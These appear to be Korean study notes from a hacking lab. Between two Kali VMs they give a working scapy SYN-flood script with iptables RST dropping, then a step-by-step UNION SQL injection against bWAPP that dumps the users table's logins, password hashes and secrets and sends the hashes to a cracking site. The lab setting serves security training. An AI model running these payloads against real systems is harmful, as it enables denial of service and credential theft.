### scapy 

​	: 파이썬으로 작성된 패킷 조작도구

​	: 패킷 디코딩, 전송, 캠쳐, 수정 등 다양한 기능을 제공

 >>> tcp = TCP()
 >>> ip = IP()
 >>> packet = ip/tcp
 >>> packet.display()

==> tcp를 ip로 캡슐화 한다



#### Kali#2(공격자)----------------------------> Kali#1(희생자)

​											------SYN------->

​										<------SYN/ACK----

#### kali 1의 터미널 창에서 설정

root@kali:~# sysctl -a | grep syncookies
net.ipv4.tcp_syncookies = 1

==>syncookies를 0으로 바꿔 ack가 오지 않더라도 끊는것이 아닌 일정시간을 기다리게 한다

root@kali:~# service apache2 start
root@kali:~# service mysql start

#### kali 2의 터미널에서 실행

root@kali:~# iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

root@kali:~# scapy

>>> ip = IP()
>>> tcp = TCP()
>>> ip.dst = "192.168.73.128"
>>> tcp.dport = 80
>>> tcp.sport = RandNum(1024, 65535)
>>> tcp.flags = "S"
>>> syn = ip/tcp
>>> send(syn, loop=True)



kali 1의 터미널 창에서 실행

root@kali:~# netstat -an | grep -i syn_recv	(grep -i 대소문자 없이 출력)

tcp6       0      0 192.168.73.128:80       192.168.73.129:15362    SYN_RECV   
tcp6       0      0 192.168.73.128:80       192.168.73.129:22850    SYN_RECV   
tcp6       0      0 192.168.73.128:80       192.168.73.129:2412     SYN_RECV   
tcp6       0      0 192.168.73.128:80       192.168.73.129:35680    SYN_RECV   
tcp6       0      0 192.168.73.128:80       192.168.73.129:32321    SYN_RECV   
tcp6       0      0 192.168.73.128:80       192.168.73.129:49919    SYN_RECV  



영화 조회 서비스 kali2->kali1의 서버로 http://192.168.73.128/bWAPP

[화면]

제목: man

[전달 <== 요청 파라미터를 통해서 전달]

sqli_1.php?title=**man**

[사용 --> 쿼리문을 만드는데 사용될 것으로 유추]

select * from movies where title =%**man**%

입력값이 전달 및 사용 과정에서 아무런 조작이 발생하지 않는지 궁금???

**##1** [화면]

제목 : **man**'

[전달 ← 요청 파라미터를 통해서 전달]

sqli_1.php?title=**man**'

[사용---> 쿼리문을 만드는데 사용될 것으로 유추]

select * from movies where title = '%**man**'%'

 ⇒ Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1

→ 백엔드 DB가 MySQL라는 정보와 화면에서 입력한 값은 그대로 쿼리 생성 및 실행에 사용된다.

**##2** 정상적인 쿼리가 반환하는 컬럼의 개수를 확인

select * from movies where title = '%**man' order by 1 --** %' ← 제목이 man으로 끝나는 영화를 조회해서 첫번째 컬럼으로 정렬

**##3** 정상적인 쿼리의 실행 결과에 공격자가 원하는 쿼리의 실행결과를 결합해서 화면에 출력

select * from movies where title = '%**man' UNION select 1,2,3,4,5,6,7 --** %'

![](C:\Users\student\TIL\캡처.PNG)

		- 1,2번은 정상적인 쿼리(man으로 끝나는 제목의 영화)
		- 3번은 공격자가 궁금해하는 쿼리의 결과
		- 화면출력을 위해서는 쿼리 실행결과에서 2,3,4,5번째 컬럼의 정보만 사용



**##4** MySQL의 시스템 테이블을 이용해서 사용자 정의 테이블의 정보를 조회

select * from movies where title = '%**man' UNION select 1,table_schema,table_name,4,5,6,7 from information_schema.tables --** %'

**##5** 테이블 이름이 users인 테이블이 가지고 있는 컬럼 정보를 조회

select * from movies where title = '%**man' UNION select 1,table_name,column_name,4,5,6,7 from information_schema.columns where table_name = 'users' --** %'

**##6** users테이블 id, login, password, email, secret 컬럼의 정보를 조회

select * from movies where title = '%**man' UNION select 1,id,login,password,concat(email, " : ", secret),6,7 from users --** %'

##7 패스워드 정보가 안전하게 저장되어있는지 확인

https://crackstation.net/ 에 위에서 찾은 해시값을 넣어보면 알 수 있다



















